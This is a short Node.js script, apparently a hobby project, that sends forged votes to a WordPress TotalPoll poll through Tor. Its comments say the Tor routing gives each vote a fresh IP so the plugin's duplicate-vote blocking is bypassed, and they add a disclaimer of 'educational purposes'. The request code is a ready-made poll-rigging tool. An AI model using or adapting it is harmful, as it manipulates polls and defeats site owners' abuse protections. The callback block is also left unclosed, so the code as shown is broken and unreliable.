var tr = require('tor-request');

// node bot.js baseDomain pollId choiceId
// node bot.js example.com 1234 1

/*
  Welcome to my TotalPoll bot.  This project is not intended to be used with
  malicious intentions and is only a simple reverse engineering of a popular
  WordPress plugin.  Keep in mind that the only reason this works is because
  TotalPoll uses cookies to keep track of users that already voted.  However,
  the plugin does offer the ability to block users by IP address after they
  have voted once already.  I take no responsibility for nefarious usage of
  this bot as it only created for educational purposes.
*/

/*
  This project is an adaptation on the previous bot that was created. This
  bot utilizes tor-request in order to randomize the IP of the vote. This
  bot therefore bypasses the TotalPoll option to block duplicate votes
  from the same IP. This bot, however, operates at a slower pace than the
  other one and cannot have multiple instances ran simultaneously. This bot
  has been created for educational purposes only and I take no responsibility
  for nerfarious usage of this bot. -Dlee99 (Dwlee99)
*/
var args = process.argv.splice(process.execArgv.length + 2);

// This is the domain of the WordPress site (without a trailing slash).
var baseDomain = args[0];
// This is the unique id number of the poll.
var pollId = args[1];
// This is the option we want to vote for (values start at zero).
var choiceId = args[2];

function sendVote() {
  var options = {
    // Add the TotalPoll vote handler page tp the base URL.
    url: 'http://' + baseDomain + '/wp-admin/admin-ajax.php',
    // TotalPoll uses POST requests to recieve data.
    method: 'POST',
    headers: {
      // Let's tell TotalPoll what format we're using to send our vote.
      'Content-Type': 'multipart/form-data'
    },
    form: {
      /*
         All of the below values can be found by inspecting your target
         poll's source code and looking through the form values.
      */
      'totalpoll[id]': pollId,
      'totalpoll[page]': '1',
      'totalpoll[view]': 'vote',
      'totalpoll[choices][]': choiceId,
      'totalpoll[action]': 'vote',
      'action': 'tp_action'
    }
  };

  // This function will handle the server's response when we get it.
  tr.request(options, function (err, res, body) {
    if (!err && res.statusCode == 200) {
      //Make sure the vote goes through
  })
}
             
sendVote(); //Send a vote
